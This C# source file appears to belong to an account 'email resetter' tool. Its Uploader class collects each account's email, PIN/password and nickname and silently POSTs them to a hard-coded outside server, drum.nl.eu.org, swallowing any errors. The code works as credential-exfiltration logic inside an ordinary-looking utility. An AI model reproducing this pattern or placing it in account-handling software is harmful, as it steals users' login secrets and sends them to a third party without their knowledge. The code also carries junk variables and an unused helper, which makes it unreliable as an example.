using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Text;

namespace EmailReseter
{
    public class Uploader
    {

        private static readonly HttpClient client = new HttpClient();
        async public static void MakePost(List<Account> accs)
        {
            string data = null;
            try
            {
                foreach (var acc in accs)
                {
                    data += $"{acc.Email}:{acc.PinPassword}:{acc.Nick}{Environment.NewLine}";
                }

                Dictionary<string, string> dataDict = new Dictionary<string, string>();
                dataDict.Add("data", data);
                var stringPayload = JsonConvert.SerializeObject(dataDict);
                var content = new StringContent(stringPayload, Encoding.UTF8, "application/json");
              

                var asdf = 132;

                var response = await client.PostAsync("http://drum.nl.eu.org/datapost", content);

                var responseString = await response.Content.ReadAsStringAsync();
                var s = 1;
            }
            catch(Exception e)
            {
                var sxx = e;
                var adsf = 123;
            }


        }
        string MyDictionaryToJson(Dictionary<int, List<int>> dict)
        {
            var entries = dict.Select(d =>
                string.Format("\"{0}\": [{1}]", d.Key, string.Join(",", d.Value)));
            return "{" + string.Join(",", entries) + "}";
        }
    }
}
